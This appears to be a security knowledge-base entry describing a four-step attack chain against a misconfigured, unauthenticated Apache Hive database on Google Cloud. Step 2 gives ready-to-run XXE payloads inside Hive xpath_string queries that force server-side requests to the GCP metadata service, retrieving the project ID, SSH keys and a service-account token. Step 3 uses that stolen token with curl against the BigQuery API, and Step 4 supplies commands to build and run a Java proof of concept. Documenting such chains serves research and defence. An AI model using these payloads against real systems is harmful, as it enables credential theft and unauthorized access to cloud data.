---
tags:
  - xxe
  - ssrf
  - gcp
  - metadata-exposure
  - hive
type: attack_chain
tools:
  - '[[tools/DataGrip]]'
  - '[[tools/gradle]]'
  - '[[tools/javac]]'
  - '[[tools/java]]'
  - '[[tools/curl]]'
  - '[[tools/Apache-Hive-JDBC-Driver]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/connect-hive-datagrip]]'
  - '[[commands/select-xpath-string-project-id]]'
  - '[[commands/select-xpath-string-ssh-keys]]'
  - '[[commands/select-xpath-string-service-token]]'
  - '[[commands/curl-bigquery-projects]]'
  - '[[commands/gradle-getdeps]]'
  - '[[commands/javac-queryhive]]'
  - '[[commands/java-queryhive-select]]'
  - '[[commands/java-queryhive-xxe]]'
platforms:
  - GCP
  - Linux
complexity: medium
procedures:
  - '[[procedures/Connect-to-Open-Apache-Hive-Database]]'
  - '[[procedures/Exploit-XXE-for-GCP-Metadata]]'
  - '[[procedures/Access-GCP-Services-with-Fetched-Token]]'
  - '[[procedures/Reproduce-Exploitation-with-Custom-Java-POC]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
description: >-
  Exploitation of an open Apache Hive database via XXE injection enabling SSRF
  to access GCP metadata and services
skill_level: intermediate
impact_level: high
id: e267a0bc-c3a1-47ae-b9af-d96ffdc2ed3e
created_at: '2025-12-13T09:00:27.792Z'
updated_at: '2025-12-13T09:00:27.792Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
---
# XXE Injection via Misconfigured Apache Hive Leading to GCP Metadata Exposure and Service Access

Multi-stage attack chain demonstrating exploitation of a misconfigured Apache Hive database in a GCP environment, using XXE injection for SSRF to access internal metadata, fetch sensitive tokens, and gain unauthorized access to cloud services like BigQuery, BigTable, and Cloud Storage.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Connect to Open Database] --> B[Execution: XXE Injection for Metadata]
    B --> C[Discovery: Access GCP Services with Token]
    C --> D[Collection: Reproduce with Custom POC]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/DataGrip]]
- [[tools/gradle]]
- [[tools/javac]]
- [[tools/java]]
- [[tools/curl]]
- [[tools/Apache-Hive-JDBC-Driver]]

### Target Environment

- Google Cloud Platform (GCP)
- Open Apache Hive database on port 10000
- Services: BigQuery, BigTable, Google Cloud Storage, GCP Metadata Service

### Initial Access Requirements

- Network access to the target's IP on port 10000
- No credentials required due to misconfiguration
- Compatible Hive client

## Detailed Attack Procedures

### Step 1: Connect to Open Apache Hive Database
procedure: [[procedures/Connect-to-Open-Apache-Hive-Database]]

**Objective**: Establish a connection to the misconfigured Apache Hive database to enable further exploitation.

**Instructions**: Use [[tools/DataGrip]] with a custom Hive JDBC driver to connect to the database at the target IP on port 10000 using [[commands/connect-hive-datagrip]].

**Expected Output**: Successful connection to the Hive database without authentication.

**Success Indicators**:
- Connection established
- Ability to execute queries

### Step 2: Exploit XXE for GCP Metadata
procedure: [[procedures/Exploit-XXE-for-GCP-Metadata]]

**Objective**: Inject XXE payloads into SQL queries to perform SSRF and fetch sensitive GCP metadata such as project IDs, SSH keys, and service account tokens.

**Instructions**: Execute the XXE payload for project ID using [[commands/select-xpath-string-project-id]]:

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

Then fetch SSH keys with [[commands/select-xpath-string-ssh-keys]]:

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

Finally, obtain the service account token using [[commands/select-xpath-string-service-token]]:

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

**Expected Output**: Retrieved metadata including project ID, SSH keys, and access token.

**Success Indicators**:
- Sensitive data fetched via SSRF
- Valid service account token obtained

### Step 3: Access GCP Services with Fetched Token
procedure: [[procedures/Access-GCP-Services-with-Fetched-Token]]

**Objective**: Utilize the fetched service account token to query and access GCP services.

**Instructions**: Set the token and query BigQuery projects using [[commands/curl-bigquery-projects]]:

```bash
TOKEN="████████"
curl https://www.googleapis.com/bigquery/v2/projects -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"
```

**Expected Output**: JSON response listing accessible GCP projects and services.

**Success Indicators**:
- Successful API responses from GCP services
- Unauthorized access confirmed to BigQuery, BigTable, etc.

### Step 4: Reproduce Exploitation with Custom Java POC
procedure: [[procedures/Reproduce-Exploitation-with-Custom-Java-POC]]

**Objective**: Build and run a custom Java proof-of-concept to reproduce the Hive connection and XXE exploitation.

**Instructions**: Fetch dependencies with [[commands/gradle-getdeps]]:

```bash
gradle getDeps
```

Compile the Java code using [[commands/javac-queryhive]]:

```bash
javac QueryHive.java
```

Test the connection with [[commands/java-queryhive-select]]:

```bash
java -classpath '.:./runtime/*' QueryHive ████████:10000 "SELECT 1"
```

Execute the XXE query using [[commands/java-queryhive-xxe]]:

```bash
java -classpath '.:./runtime/*' QueryHive ██████:10000 $CMD
```

**Expected Output**: Successful query execution and metadata retrieval via Java POC.

**Success Indicators**:
- POC compiles and runs successfully
- Exploitation reproduced independently

## Attack Chain Summary

### Key Achievements

1. Gained initial access to open database
2. Exploited XXE for SSRF to fetch GCP metadata
3. Accessed cloud services with stolen token
4. Created reproducible POC for validation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Information Repositories]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Discovery]]
- [[Collection]]

*Last updated: [TIMESTAMP]*
